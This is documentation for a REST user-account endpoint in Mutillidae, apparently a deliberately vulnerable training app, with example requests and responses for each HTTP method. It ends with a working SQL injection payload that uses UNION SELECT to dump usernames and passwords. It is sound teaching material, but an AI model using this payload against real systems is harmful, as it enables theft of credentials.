WS User Account Service Documentation

The WS User Account Service is a RESTful web service that allows you to manage user accounts. You can create, retrieve, update, and delete user accounts using appropriate HTTP methods.

Note for Beginners: This documentation provides step-by-step examples for testing each method using Burp Repeater and the curl command.

Endpoint

The service is available at the following endpoint:

/webservices/rest/ws-user-account.php

Supported HTTP Methods

  • GET: Retrieve user account(s) information.
  • POST: Create a new user account.
  • PUT: Update an existing account or create a new one.
  • DELETE: Delete a user account.
  • OPTIONS: Get CORS-related information.

Request and Response Examples

1. GET (Retrieve User Information)

Optional Query Parameter: username

  • If username=*, all accounts will be returned.
  • If a specific username is provided, only that userâ€™s details will be returned.
Example: 
GET /webservices/rest/ws-user-account.php?username=adrian HTTP/1.1
Host: mutillidae.localhost
Accept: application/json
Connection: close

Response

{
    "Result": {
        "Accounts": [
            {
                "username": "adrian",
                "firstname": "Adrian",
                "lastname": "Smith",
                "signature": "AS"
            }
        ]
    }
}

2. POST (Create a New Account)

Required Parameters (POST body):

  • username
  • password
  • firstname
  • lastname

Optional Parameter: signature

POST /webservices/rest/ws-user-account.php HTTP/1.1
Host: mutillidae.localhost
Content-Type: application/x-www-form-urlencoded

username=john&password=pass123&firstname=John&lastname=Doe&signature=JD

Response

{
    "Result": "Inserted account 'john'",
    "Success": true
}

3. PUT (Update an Existing Account)

If the account exists, it will be updated. Otherwise, a new account will be created.

PUT /webservices/rest/ws-user-account.php HTTP/1.1
Host: mutillidae.localhost
Content-Type: application/x-www-form-urlencoded

username=john&password=newpass123&firstname=John&lastname=Doe&signature=JDoeUpdated

Response

{
    "Result": "Updated account 'john'.",
    "RowsAffected": 1,
    "Success": true
}

4. DELETE (Remove a User Account)

Required Parameters (POST body):

  • username
  • password
DELETE /webservices/rest/ws-user-account.php HTTP/1.1
Host: mutillidae.localhost
Content-Type: application/x-www-form-urlencoded

username=john&password=newpass123

Response

{
    "Result": "Deleted account 'john'.",
    "Success": true
}

Error Handling

  • 405 Method Not Allowed: Returned when an unsupported HTTP method is used.
  • 500 Internal Server Error: Returned if the server encounters an issue processing the request.

Learn More

To practice SQL injection, try sending the following query:

GET /webservices/rest/ws-user-account.php?username=jeremy'+union+select+concat('The+password+for+',username,'+is+',password),signature+from+accounts+-- HTTP/1.1
Host: mutillidae.localhost
Important: This service is vulnerable to SQL injection when the security level is set to 0. Use it responsibly and only in a controlled environment.
